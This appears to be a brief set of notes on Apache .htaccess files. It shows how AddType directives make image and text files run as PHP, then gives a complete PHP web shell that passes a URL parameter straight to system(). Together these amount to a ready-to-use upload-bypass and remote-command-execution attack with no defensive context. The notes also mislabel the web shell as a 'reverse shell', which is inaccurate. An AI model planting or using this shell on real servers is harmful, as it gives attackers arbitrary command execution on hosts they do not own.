# .htaccess Notes (Quick Reference)

## What is .htaccess
`.htaccess` is a per-directory Apache configuration file.  
It lets you change how Apache handles files **without server-level access**.

Apache reads `.htaccess` before serving any file in that directory.

---

## What .htaccess Can Do
- Control which file extensions execute as PHP
- Allow or block access (IP, auth, local-only)
- Disable directory listing
- Rewrite URLs
- Change MIME types

---

## Executing Non-PHP Files as PHP
You can force Apache to treat other extensions as PHP:

```apache
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .txt

```

This code, when executed, provides a reverse shell due to execution being enabled via .htaccess.

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
